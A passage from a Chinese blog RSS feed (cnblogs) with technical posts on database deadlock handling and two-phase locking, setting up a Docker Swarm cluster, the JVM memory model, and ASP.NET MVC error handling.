&lt;p&gt;一次封锁法要求事务必须一次将所有要使用的数据全部加锁，否则不能继续执行。例如上图中的事务T1将数据R1和R2一次加锁，T1就能执行下去，而T2等待。T1执行完成之后释放R1，R2上的锁，T2继续执行。这样就不会产生死锁。&lt;/p&gt;
&lt;p&gt;一次封锁法虽然能防止死锁的发生，但是缺点却很明显。一次性将以后要用到的数据加锁，势必扩大了封锁的范围 ，从而降低了系统的并发度。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;②顺序封锁法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;顺序封锁法是预先对数据对象规定一个封锁顺序，所有的事务都按照这个顺序实行封锁。&lt;/p&gt;
&lt;p&gt;顺序封锁法虽然可以有效避免死锁，但是问题也很明显。第一，数据库系统封锁的数据对象极多，并且随着数据的插入、删除等操作不断变化，要维护这样的资源的封锁顺序非常困难，成本很高。第二，事务的封锁请求可以随着事务的执行动态的确定，因此很难按照规定的顺序实行封锁。&lt;/p&gt;
&lt;p&gt;可见，预防死锁的产生并不是很适合数据库的特点，所以在解决死锁的问题上普遍采用的是诊断并且解除死锁。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;死锁的诊断与解除&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;①超时法&lt;/p&gt;
&lt;p&gt;如果一个事务的等待时间超过了默认的时间，就认为是产生了死锁。&lt;/p&gt;
&lt;p&gt;②等待图法&lt;/p&gt;
&lt;p&gt;一旦检测到系统中存在死锁就要设法解除。通常的解决方法是选择一个处理死锁代价最小的事务，将其撤销，释放此事务持有的所有的锁，恢复其所执行的数据修改操作，使得其他事务得以运行下去。&lt;/p&gt;

&lt;p&gt;所谓的二段锁协议是指所有事务必须分&lt;strong&gt;两个阶段&lt;/strong&gt;对数据进行&lt;strong&gt;加锁和解锁&lt;/strong&gt;操作。&lt;/p&gt;
&lt;p&gt;也就是说事务分为两个阶段。第一个阶段是获得封锁，也称为扩展阶段。在这个阶段，事务可以申请获得任何数据项任何类型的锁，但是不能释放任何锁。第二阶段是释放封锁，也称为收缩阶段。在这个阶段，事务可以释放任何数据项上任何类型的封锁，但是不能再申请任何锁。&lt;/p&gt;
&lt;p&gt;事务遵守两段锁协议是可串行化调度的充分条件，而不是必要条件。也就是说遵守两段锁协议一定是可串行化调度的，而可串行化调度的不一定是遵守两段锁协议的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/HgimdD0mE2.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;br/&gt;左侧T1、T2遵循两段锁协议，右侧T1、T2并不遵循两段锁协议&lt;/p&gt;
&lt;h2 id=&quot;两段锁协议和一次封锁法的异同&quot;&gt;两段锁协议和一次封锁法的异同&lt;/h2&gt;
&lt;p&gt;一次封锁法要求事务必须将要使用的数据全部加锁，否则不能继续执行。因此一次封锁法遵守两段锁协议。&lt;/p&gt;
&lt;p&gt;但是两段锁协议并不要求事务将要使用的数据一次全部加锁，因此两段锁协议可能发生死锁。如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/4gDij9c5gF.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;封锁协议和隔离级别并不是严格对应的&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;各种隔离级别所能避免的并发问题&quot;&gt;各种隔离级别所能避免的并发问题&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://p66d6e5qt.bkt.clouddn.com/blog/180326/f58HGjHm5b.png?imageslim&quot; alt=&quot;mark&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;本文为博主学习感悟总结，水平有限，如果不当，欢迎指正。&lt;/p&gt;
&lt;p&gt;如果您认为还不错，不妨点击一下下方的&lt;span onclick=&quot;Digg();&quot;&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;【&lt;span&gt;&lt;strong&gt;推荐&lt;/strong&gt;&lt;/span&gt;】&lt;/a&gt;&lt;/span&gt;按钮，谢谢支持。&lt;/p&gt;
&lt;p&gt;转载与引用请注明出处。&lt;/p&gt;
</description>
<pubDate>Mon, 26 Mar 2018 06:47:00 +0000</pubDate>
<dc:creator>喜欢天黑却怕鬼</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/songwenjie/p/8644674.html</dc:identifier>
</item>
<item>
<title>docker进阶-利用dcoker Swarm搭建简单集群 - 进击的小羊驼</title>
<link>http://www.cnblogs.com/pass245939319/p/8650472.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pass245939319/p/8650472.html</guid>
<description>&lt;h4 id=&quot;什么是swarm&quot;&gt;什么是Swarm&lt;/h4&gt;
&lt;p&gt;  在介绍Swarm之前我们要说一下什么Docker三剑客？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Docker-Machine:负责在多种平台上快速安装 Docker 环境。&lt;/li&gt;
&lt;li&gt;Docker-Compose:Docker官网编排工具。负责快速的部署分布式应用&lt;/li&gt;
&lt;li&gt;Docker-Swarm: Docker 容器集群服务，是 Docker 官方对容器云生态进行支持的核心方案。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;   Swarm翻译中文的意思是蜂群的意思。大家都知道蜂群是很很多多蜜蜂在一起。里面有蜂王和工蜂，各司其职。那么在我们技术界把许许多多的Docker组织在一起，这样就是Docker集群。Swarm就是管理这些Docker的工具。同蜂群一样。也有蜂王(Master节点)工蜂(Node节点)各司其职。蜂王能调度和指挥所有的工蜂来完成各种任务。实现整个蜂群的正常运转。&lt;/p&gt;
&lt;h4 id=&quot;为什么要用swarm&quot;&gt;为什么要用Swarm&lt;/h4&gt;
&lt;p&gt;  因为在生产环境中使用单个Docker节点是远远不够的，搭建Docker集群势在必行。 这样能保证我们的服务可以做到不怠机。长时间稳定的运转下去。虽然Docker集群管理工具很多，有比较有名的Kubernetes和Mesos。但是我们为什么要选择Swarm呢？。首先对于一个刚刚入门和接触Docker的人来说。最好的学习资料是官方文档。Swarm是原生的，同时也是最简单，最易学，最节省资源的Docker集群管理工具。所以我相信Swarm不会让我失望的。&lt;/p&gt;
&lt;h4 id=&quot;关于machine&quot;&gt;关于Machine&lt;/h4&gt;
&lt;p&gt;  由于我们等会要使用Machine来创建节点。所以介绍Machine的基本使用。&lt;/p&gt;
&lt;h5 id=&quot;machine安装&quot;&gt;Machine安装&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;#由于MacOs在安装docker的时候。已经默认安装Machine.这里根据官网给出的Linux安装命令
sudo curl -L https://github.com/docker/machine/releases/download/v0.13.0/docker-machine-`uname -s`-`uname -m` &amp;gt; /usr/local/bin/docker-machine
#添加权限
 sudo chmod +x /usr/local/bin/docker-machine
#查看当前Machine版本
docker-machine -v
#安装MacOs虚拟机xhyve驱动。也可以跳过
brew install docker-machine-driver-xhyve&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;使用machine-创建虚拟机&quot;&gt;使用Machine 创建虚拟机&lt;/h5&gt;
&lt;p&gt;使用Machine创建4个虚拟机&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#create命令后面可以添加自定义参数.可以通过docker-machine create --driver virtualbox --help查看
#创建Master节点.这里dm因为我使用自定义命令。等同于docker-machine
dm create Master
#可以通过ls命令查看当前虚拟机.然后我们分别建立3个node节点，node1，node2,node3
dm create Node1
dm create Node2
dm create Node3
#创建然后通过ls查看
dm ls
######################
NAME     ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS
Master   -        virtualbox   Running   tcp://192.168.99.100:2376           v18.03.0-ce
Node1    -        virtualbox   Running   tcp://192.168.99.102:2376           v18.03.0-ce
Node2    -        virtualbox   Running   tcp://192.168.99.103:2376           v18.03.0-ce
Node3    -        virtualbox   Running   tcp://192.168.99.103:2376           v18.03.0-ce&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  到此4台虚拟机已经创建完毕。下面开始使用Swarm搭建一个集群。&lt;/p&gt;
&lt;h4 id=&quot;swarm实践&quot;&gt;Swarm实践&lt;/h4&gt;
&lt;h5 id=&quot;创建集群&quot;&gt;创建集群&lt;/h5&gt;
&lt;p&gt;  首先我们需要登录到Master这台虚拟机。创建初始化一个集群。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#登录到Master
dm ssh Master
#初始化集群。注意这里由于是虚拟机。有多个ip。所有必须制定ip.否则会报错.
docker swarm init --advertise-addr 192.168.99.100
#这里会提示创建manager成功。如果要加入worker。只需要在别的主机里面输入它已经生成的号的命令输入就可以了。
 docker swarm join --token SWMTKN-1-03e4mo13jpizh15kroub1qsxdxk6zj8qgu2y3acwi1v14zaqpe-e6hhlamgqa9m7w4601biqqtg9 192.168.99.100:2377
#登入Node1
dm ssh Node1
#输入上面命令。Node2和Node3操作一样
docker swarm join --token SWMTKN-1-03e4mo13jpizh15kroub1qsxdxk6zj8qgu2y3acwi1v14zaqpe-e6hhlamgqa9m7w4601biqqtg9 192.168.99.100:2377
#登录Master，查看状态
dm ssh Master
#查看集群
docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS      ENGINE VERSION
0vol8fdjksmabvmgx0x60ncyd *   Master              Ready               Active              Leader              18.03.0-ce
jnuun47ezvi0bl1iz1ccxmgto     Node1               Ready               Active                                  18.03.0-ce
ye6ghynu19tvdkf51kof13w6y     Node2               Ready               Active                                  18.03.0-ce
x84fqdefi4461gf087qcb9nmt     Node3               Ready               Active                                  18.03.0-ce&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  这里会看到4台虚拟机。其中Master台是Leader （就是我们的蜂王）,剩下的3台就是我们的worker（工蜂）到这里我们一个简单的小集群就搭建完毕了。&lt;/p&gt;
&lt;h5 id=&quot;运行服务&quot;&gt;运行服务&lt;/h5&gt;
&lt;p&gt;  我们已经搭建好了集群。但是要怎么样通过Master管理我们的worker节点呢？&lt;br/&gt;首先我们需要登录到Master这台虚拟机。然后通过这个台虚拟机来控制3个worker节点&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#登录Master
dm ssh Master
#运行服务。
docker service create --replicas 4 -p 80:80 --name nginx nginx
#查看集群运行的服务
service ps nginx&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://img.shepherd618.cn/docker_swfit.png&quot; alt=&quot;enter image description here&quot;/&gt;&lt;br/&gt;  这个时候4个虚拟机已经全部安装了nginx这个服务。我们打开任意一个节点的ip打开就可以看到熟悉的&quot;Welcome to nginx!&quot;的页面了。到此整个教程结束。&lt;/p&gt;
</description>
<pubDate>Mon, 26 Mar 2018 05:56:00 +0000</pubDate>
<dc:creator>进击的小羊驼</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pass245939319/p/8650472.html</dc:identifier>
</item>
<item>
<title>JVM内存模型 - 健身码农</title>
<link>http://www.cnblogs.com/wupeixuan/p/8650455.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wupeixuan/p/8650455.html</guid>
<description>&lt;p&gt;Java虚拟机（Java Virtual Machine，简称JVM）在执行Java程序的过程中会把它所管理的内存划分为若干个不同的数据区域。这些区域都有各自的用途，以及创建和销毁的时间，有的区域随着虚拟机进程的启动而存在，有些区域则是依赖用户线程的启动和结束而建立和销毁。&lt;br/&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/wupeixuan/1186116/o_dc695f48-4189-4fc7-b950-ed25f6c1521708518830.jpg&quot; alt=&quot;JVM内存模型&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注：白色区域为线程私有，蓝色区域为线程共享。&lt;/p&gt;
&lt;h2 id=&quot;程序计数器program-counter-register&quot;&gt;程序计数器（Program Counter Register）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;程序计数器（Program Counter Register）是一块较小的内存空间，它的作用可以看做是当前线程所执行的字节码的行号指示器。在虚拟机的概念模型里（仅是概念模型，各种虚拟机可能会通过一些更高效的方式去实现），字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。&lt;/li&gt;
&lt;li&gt;由于Java虚拟机的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，在任何一个确定的时刻，一个处理器（对于多核处理器来说是一个内核）只会执行一条线程中的指令。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各条线程之间的计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。&lt;/li&gt;
&lt;li&gt;如果线程正在执行的是一个Java方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果正在执行的是Natvie方法，这个计数器值则为空（&lt;code&gt;undefined&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;此内存区域是唯一一个在Java 虚拟机规范中没有规定任何OutOfMemoryError情况的区域。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;java虚拟机栈jvm-stacks&quot;&gt;Java虚拟机栈（JVM Stacks）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;与程序计数器一样，Java虚拟机栈（Java Virtual Machine Stacks）也是线程私有的，&lt;strong&gt;它的生命周期与线程相同。虚拟机栈描述的是Java方法执行的内存模型&lt;/strong&gt;：每个方法被执行的时候都会同时创建一个栈帧（Stack Frame）用于存储局部变量表、操作栈、动态链接、方法出口等信息。&lt;strong&gt;每一个方法被调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;局部变量表&lt;/strong&gt;存放了编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference类型），它不等同于对象本身，根据不同的虚拟机实现，它可能是一个指向对象起始地址的引用指针，也可能指向一个代表对象的句柄或者其他与此对象相关的位置）和returnAddress类型（指向了一条字节码指令的地址）。&lt;strong&gt;其中64位长度的long和double类型的数据会占用2个局部变量空间（Slot），其余的数据类型只占用1个。局部变量表所需的内存空间在编译期间完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;该区域可能抛出以下异常：
&lt;ol&gt;&lt;li&gt;当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常；&lt;/li&gt;
&lt;li&gt;栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;可以通过 -Xss 这个虚拟机参数来指定一个程序的 Java 虚拟机栈内存大小：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;java -Xss=512M JvmDemo&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;本地方法栈native-method-stacks&quot;&gt;本地方法栈（Native Method Stacks）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;本地方法栈（Native MethodStacks）与虚拟机栈所发挥的作用是非常相似的，其区别不过是虚拟机栈为虚拟机执行Java方法（也就是字节码）服务，而&lt;strong&gt;本地方法栈则是为虚拟机使用到的Native 方法服务&lt;/strong&gt;。虚拟机规范中对本地方法栈中的方法使用的语言、使用方式与数据结构并没有强制规定，因此具体的虚拟机可以自由实现它。甚至有的虚拟机（譬如Sun HotSpot 虚拟机）直接就把本地方法栈和虚拟机栈合二为一。&lt;/li&gt;
&lt;li&gt;与虚拟机栈一样，本地方法栈区域也会抛出StackOverflowError和OutOfMemoryError异常。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;java堆heap&quot;&gt;Java堆（Heap）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;对于大多数应用来说，Java堆（Java Heap）是Java虚拟机所管理的内存中&lt;strong&gt;最大&lt;/strong&gt;的一块。Java堆是被所有&lt;strong&gt;线程共享&lt;/strong&gt;的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例，&lt;strong&gt;几乎所有的对象实例都在这里分配内存&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;Java堆是垃圾收集器管理的主要区域，因此很多时候也被称做“&lt;strong&gt;GC堆&lt;/strong&gt;”。如果从内存回收的角度看，由于现在收集器基本都是采用的分代收集算法，所以Java堆中还可以细分为：&lt;strong&gt;新生代和老年代；再细致一点的有Eden空间、From Survivor空间、To Survivor空间等&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;Java 堆不需要连续内存，并且可以通过动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。&lt;br/&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/wupeixuan/1186116/o_ppt_img.gif&quot; alt=&quot;JVM内存模型&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;可以通过 -Xms 和 -Xmx 两个虚拟机参数来指定一个程序的 Java 堆内存大小，第一个参数设置最小值，第二个参数设置最大值。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;java -Xms=1M -XmX=2M JvmDemo&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;方法区method-area&quot;&gt;方法区（Method Area）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。&lt;/li&gt;
&lt;li&gt;和 Java 堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。&lt;/li&gt;
&lt;li&gt;对这块区域进行垃圾回收的主要目标是对&lt;strong&gt;常量池的回收和对类的卸载&lt;/strong&gt;，但是一般比较难实现，HotSpot 虚拟机把它当成永久代（Permanent Generation）来进行垃圾回收。&lt;/li&gt;
&lt;li&gt;方法区逻辑上属于堆的一部分，但是为了与堆进行区分，通常又叫“非堆”。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/wupeixuan/1186116/o_3386279134-5a9ac99f40336.jpg&quot; alt=&quot;方法区区别&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注：移除永久代的工作从JDK1.7就开始了。JDK1.7中，存储在永久代的部分数据就已经转移到了Java堆（Java Heap）或者是Native堆（Native Heap）。但永久代仍存在于JDK1.7中，并没完全移除，譬如符号引用(Symbols)转移到了native heap；字面量(interned strings)转移到了java heap；类的静态变量(class statics)转移到了java heap。而在JDK1.8中, 永久区已经被彻底移除, 取而代之的是&lt;strong&gt;元数据区（Metaspace）&lt;/strong&gt;(这一点在查看GC日志和使用jstat -gcutil查看GC情况时可以观察到),元空间的本质和永久代类似，都是对JVM规范中方法区的实现。不过元空间与永久代之间最大的区别在于：&lt;strong&gt;元空间并不在虚拟机中，而是使用本地内存。因此，默认情况下，元空间的大小仅受本地内存限制。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;运行时常量池runtime-constant-pool&quot;&gt;运行时常量池（Runtime Constant Pool）&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;运行时常量池是方法区的一部分。&lt;/li&gt;
&lt;li&gt;Class 文件中的常量池（编译器生成的各种字面量和符号引用）会在类加载后被放入这个区域。&lt;/li&gt;
&lt;li&gt;除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。这部分常量也会被放入运行时常量池。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;直接内存direct-memory&quot;&gt;直接内存（Direct Memory）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;直接内存（Direct Memory）并不是虚拟机运行时数据区的一部分，也不是Java虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用，而且也可能导致OutOfMemoryError 异常出现。&lt;/li&gt;
&lt;li&gt;在 JDK 1.4 中新加入了 NIO 类，引入了一种基于通道（Channel）与缓冲区（Buffer）的 I/O方式，它可以使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java 堆和 Native 堆中来回复制数据。&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Mon, 26 Mar 2018 05:53:00 +0000</pubDate>
<dc:creator>健身码农</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wupeixuan/p/8650455.html</dc:identifier>
</item>
<item>
<title>ASP.NET MVC编程——错误处理与日记 - 甜橙很酸</title>
<link>http://www.cnblogs.com/hdwgxz/p/8650244.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hdwgxz/p/8650244.html</guid>
<description>&lt;p&gt;ASP.NET MVC的错误处理应考虑到这几个方面：模型绑定期间发生的错误，未能路由到指定操作，针对控制器的错误处理。使用配置文件可以帮助我们处理异常，但是不够灵活和全面；使用HandleErrorAttribute&lt;span&gt;、&lt;/span&gt;&lt;span&gt;自定义错误过滤器或重写控制器&lt;/span&gt;OnException方法只能解决针对控制器的错误，无法解决模型绑定期间发生的错误，也无法处理404错误，即使将错误过滤器注册为全局过滤器也是如此。有时候需要多种方法配合使用。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在捕获错误的地方，可以将有用的信息记录下来，便于我们查出引起问题的原因和纠正错误。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1启用自定义错误&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用这种方式一定要注意将&lt;/span&gt;defaultRedirect&lt;span&gt;设置为指定的错误页面，防止黑客探测各种错误情形进而发现系统的额漏洞。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;lt;system.web&amp;gt;
  &amp;lt;customErrors mode=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;On&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; defaultRedirect=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/error/error2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;error statusCode=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;404&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; redirect=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/error/error1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
  &amp;lt;/customErrors&amp;gt;
  &amp;lt;!--其他配置--&amp;gt;
&amp;lt;/system.web&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mode:处理模式，有三种处理模式&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;On,启用自定义处理功能，当错误发生时显示自定义错误页&lt;/li&gt;
&lt;li&gt;Off,关闭自定义错误处理功能，当错误发生时显示默认的错误页。&lt;/li&gt;
&lt;li&gt;RemoteOnly，&lt;span&gt;启用自定义错误处理功能，但只针对来自远程机器的请求有效。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;defaultRedirect&lt;span&gt;：&lt;/span&gt;&lt;span&gt;发生错误时，显示指定错误页。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;error&amp;gt;:&lt;span&gt;根据状态码显示指定的错误页。&lt;/span&gt;mode必须为On或RemoteOnly&lt;span&gt;模式，否则不会起作用。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;注意：不论&lt;/span&gt;defaultRedirect&lt;span&gt;和&lt;/span&gt;redirect&lt;span&gt;都配置为指定的路径，例如上述配置中控制器&lt;/span&gt;error&lt;span&gt;，控制器操作为&lt;/span&gt;error1和error2，相应地错误页为Error1.cshtml和Error2.cshtml。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;针对控制器的错误处理&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.1&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;使用&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;HandleErrorAttribute&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;修饰控制器或操作。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method, Inherited = &lt;span&gt;true&lt;/span&gt;, AllowMultiple = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)]
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HandleErrorAttribute : FilterAttribute, IExceptionFilter
{
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取或设置异常的类型。&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; Type ExceptionType { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; } 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取或设置用于显示异常信息的母版视图&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Master { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取此特性的唯一标识符。&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;object&lt;/span&gt; TypeId { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取或设置用于显示异常信息的页视图。&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; View { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在发生异常时调用。 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;filterContext:操作筛选器上下文&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnException(ExceptionContext filterContext);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;例：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;当发生&lt;/span&gt;KeyNotFoundException&lt;span&gt;类型的异常时，显示&lt;/span&gt;KeyNotFind&lt;span&gt;视图&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[HandleError(ExceptionType=&lt;span&gt;typeof&lt;/span&gt;(KeyNotFoundException),View=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;KeyNotFound&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ActionResult Index()
{
    ......
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;还可以使用自定义的错误过滤器，并将其应用到控制器或操作上。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CustomHandleError : HandleErrorAttribute
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnException(ExceptionContext filterContext)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (filterContext==&lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;.OnException(filterContext);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;记录日志&lt;/span&gt;
&lt;span&gt;            LogError(filterContext.Exception);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否启用了自定义错误&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (filterContext.HttpContext.IsCustomErrorEnabled)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将错误设置为已处理&lt;/span&gt;
                filterContext.ExceptionHandled = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;.OnException(filterContext);
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;可以设置全局过滤器，这样对每一个控制器都起作用。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;App_Start文件夹下FilterConfig.cs文件中设置全局错误过滤器，过滤器会按照他们注册的顺序执行。但可以通过Order属性指定执行顺序。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
